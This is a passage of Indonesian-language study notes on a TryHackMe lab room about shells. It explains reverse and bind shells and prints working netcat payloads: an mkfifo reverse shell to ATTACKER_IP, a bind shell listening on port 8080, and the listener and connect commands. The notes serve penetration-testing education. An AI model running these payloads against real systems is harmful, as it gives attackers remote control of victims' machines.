# TryHackMe: Shells Overview

- **Room Link:** [Shells Overview](https://tryhackme.com/room/shellsoverview)
- **Category:** Offensive Security Tooling
- **Difficulty:** Easy

## Task 1: Shellls Introduction

Shells dalam cybersecurity sering sekali dipakai oleh attackers buat ngontrol sistem dari jarak jauh (remote), yang bikin mereka jadi bagian penting dari rantai serangan (attack chain)., kita bakal eksplor berbagai jenis shells yang dipake dalam offensive security, bedanya apa aja, dan kapan pakainya. Pengetahuan ini bisa ngebantu ningkatin skill penetration testing dan exploitation, dan juga ngebantu kita paham gimana cara mendeteksi kalau ada remote shell yang lagi dipake attacker di dalam organisasi.

### Learning Objectives

kita bakal bahas tujuan pembelajaran berikut:

- Memahami Shells dalam Offensive Security
- Cara Setup dan Menggunakan Reverse dan Bind Shells
- Deploy Web Shells

## Task 2: Shells Overview

### What is a Shell?

Shell itu ibarat jembatan alias software yang bikin kita bisa ngobrol sama Sistem Operasi (OS). Bisa bentuknya grafis (GUI), tapi biasanya Command-Line Interface (CLI), tergantung OS targetnya.

Di dunia cyber security, shell ini merujuk ke sesi khusus yang dipake attacker pas berhasil jebol sistem. Lewat shell ini, mereka bisa jalanin perintah atau software sesuka hati.

Banyak hal nakal yang bisa dilakuin kalau udah dapet shell:

- **Remote System Control**: Attacker bisa ngontrol sistem target dari jauh.
- **Privilege Escalation**: Kalau akses awal masih terbatas (user biasa), attacker bakal cari cara buat naik pangkat jadi admin/root.
- **Data Exfiltration**: Bisa baca dan copy data-data sensitif keluar dari sistem.
- **Persistence**: Bikin "pintu belakang" (backdoor) atau user baru biar nanti bisa masuk lagi kapan aja tanpa harus nge-hack dari ulang.
- **Post-Exploitation**: Aktivitas lanjutan kayak sebar malware, bikin akun tersembunyi, atau hapus jejak (logs).
- **Pivoting**: Pake sistem yang udah dijebol buat nyerang sistem lain di jaringan yang sama. Jadi batu loncatan gitu.

Intinya, semua jenis shell yang bakal kita bahas nanti tujuannya ya buat memfasilitasi aksi-aksi di atas ini.

## Task 3: Reverse Shell

### Reverse Shell

Reverse shell, atau kadang disebut **"connect back shell"**, adalah teknik paling populer buat dapet akses ke sistem target.

Bedanya sama shell biasa, di sini **koneksi dimulai dari sistem target ke mesin attacker**.

Kenapa gini? Biar bisa ngehindarin deteksi firewall. Biasanya firewall ngeblok koneksi masuk (ingress) sembarangan, tapi ngebolehin koneksi keluar (egress). Jadi kalau target yang connect duluan ke kita, firewall seringkali bakal ngebolehin dan kita dapet shell.

### How Reverse Shells Work

**Set up a Netcat (nc) Listener**

Biar paham cara kerjanya, kita coba pake tools **Netcat**. Tools ini support banyak OS dan bisa baca/tulis data lewat jaringan.

Seperti yang udah dibahas, reverse shell bakal _connect back_ ke mesin attacker. Jadi, di sisi attacker (kita), kita harus "nungguin" koneksi itu. Caranya kita pasang **Listener** pake command berikut:

```bash
nc -lvnp 443
listening on [any] 4444 ...
```

Penjelasan flag-nya:

- `-l`: **Listen mode**, nyuruh Netcat buat nunggu koneksi masuk.
- `-v`: **Verbose**, biar lebih cerewet (nampilin output lebih detail).
- `-n`: **No DNS**, gak usah resolve hostname, pake IP aja biar cepet.
- `-p`: **Port**, nentuin port mana yang mau dipake buat nunggu (contoh di atas pake port **443**).

**Tips:** Kenapa pake port 443?
Sebenernya port berapa aja bisa (53, 80, 8080, 139, 445), tapi attacker sering pake port umum kayak **80 (HTTP)** atau **443 (HTTPS)**. Tujuannya biar koneksinya nyatu sama traffic internet biasa, jadi gak dicurigai sama security appliances atau firewall.

### Gaining Reverse Shell Access

Setelah listener siap, langkah selanjutnya adalah attacker harus ngejalanin **payload reverse shell** di mesin target.

Payload ini biasanya manfaatin celah keamanan (vulnerability) atau akses ilegal yang udah didapet sebelumnya buat ngejalanin perintah yang bakal ngebuka shell aka akses sistem lewat jaringan.

Ada banyak jenis payload tergantung OS dan tools yang ada. Salah satu contoh klasik yang sering dipake adalah **Pipe Reverse Shell**.

Contoh payload-nya kayak gini:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Penjelasan Payload:**

- `rm -f /tmp/f`: Hapus file `/tmp/f` kalau udah ada, biar gak error.
- `mkfifo /tmp/f`: Bikin **Named Pipe** (FIFO - First In First Out) di `/tmp/f`. Pipe ini fungsinya kayak saluran komunikasi dua arah.
- `cat /tmp/f`: Baca data dari pipe itu dan nunggu input masuk.
- `| sh -i 2>&1`: Output dari `cat` (input kita) dioper ke shell (`sh`) secara interaktif (`-i`). `2>&1` artinya redirect error message ke standard output, jadi kita bisa liat kalau ada error.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: Output dari shell (hasil perintah yang dijalankan) dikirim balik ke attacker lewat Netcat. Tanda `>/tmp/f` ngebalikin lagi outputnya ke pipe awal, biar jadi _loop_ komunikasi dua arah yang jalan terus.

Intinya, payload ini ngebuka shell `bash` atau `sh` dan "membuang" input/output-nya ke Netcat listener kita.

### Attacker Receives the Shell

Begitu payload dijalankan di target, listener di mesin attacker bakal nangkep koneksinya dan Kita dapet akses shell.

Contoh output di terminal attacker bakal kayak gini:

```bash
attacker@arch:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@rootuser:~$
```

Liat baris `connect to ... from ...`, itu tandanya koneksi berhasil!
Sekarang kita bisa ketik perintah di terminal kita, dan perintah itu bakal dieksekusi di mesin target (si `target@rootuser`). Rasanya kayak kita lagi duduk di depan komputer target langsung.

Dari sini, kita bisa lanjut ke tahap berikutnya kayak **Privilege Escalation** atau **Data Exfiltration**.

## Task 4: Bind Shell

### Bind Shell

Jadi kebalikannya reverse shell, di sini **attacker yang connect ke target**.

Alurnya:

1. Target buka port **(listening)**.
2. Attacker connect ke IP & Port target.
3. Attacker dapet akses shell.

Teknik ini biasanya dipake kalau target punya aturan firewall yang ketat buat koneksi keluar (outgoing blocked), tapi ada celah buat koneksi masuk.

**Kekurangan:**
Cara ini kurang populer karena butuh port yang terbuka dan nunggu di sisi target, yang mana gampang banget dideteksi sama firewall atau Intrusion Detection System (IDS).

### How bind shells work

**Setting Up the Bind Shell on the Target**

Biar bisa jalan, kita harus bikin target "listening" dulu. Salah satu command yang bisa dipake di mesin target adalah:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Penjelasan Payload:**

- `rm -f /tmp/f`: Hapus file `/tmp/f` kalau ada, biar bersih dan gak konflik.
- `mkfifo /tmp/f`: Bikin **Named Pipe** di `/tmp/f`. Ini saluran komunikasi dua arah kita.
- `cat /tmp/f`: Baca data dari pipe dan nunggu input.
- `| bash -i 2>&1`: Output `cat` dioper ke shell `bash` secara interaktif. Error message (`stderr`) juga diredirect ke `stdout`.
- `| nc -l 0.0.0.0 8080`: Jalanin Netcat dalam **listen mode** (`-l`) di semua interface (`0.0.0.0`) port **8080**. Ini intinya nungguin attacker buat connect.
- `> /tmp/f`: Output dari Netcat (hasil perintah shell) dibalikin lagi ke pipe, biar komunikasinya nyambung terus.

**Catatan:**
Kita pake port **8080** karena port di bawah 1024 (kayak 80, 443) butuh akses **root** (elevated privileges). Kalau kita cuma user biasa, kita harus pake port tinggi (di atas 1024).

**Terminal on the Target Machine:**

```bash
target@rootuser:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Setelah command ini dijalankan, terminal target bakal "gantung" (waiting) nungguin koneksi dari kita.

### Attacker Connects to the Bind Shell

Sekarang setelah target "menunggu" di port 8080, kita sebagai attacker tinggal inisiasi koneksi ke sana pake Netcat.

Command-nya:

```bash
nc -nv TARGET_IP 8080
```

**Penjelasan Command:**

- `nc`: Panggil Netcat.
- `-n`: **No DNS**, biar cepet dan gak berisik ngelakuin DNS lookup.
- `-v`: **Verbose**, biar kita tau pas koneksinya berhasil ("open").
- `TARGET_IP`: IP address mesin target yang udah kita pasangin bind shell.
- `8080`: Port yang lagi dibuka sama bind shell di target.

**Attacker Terminal (After Connection):**

```bash
attacker@arch:~$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@rootuser:~$
```

Pas koneksi berhasil (`open`), kita langsung dapet shell Coba ketik perintah kayak `whoami` atau `ls`, pasti jalan di mesin target.
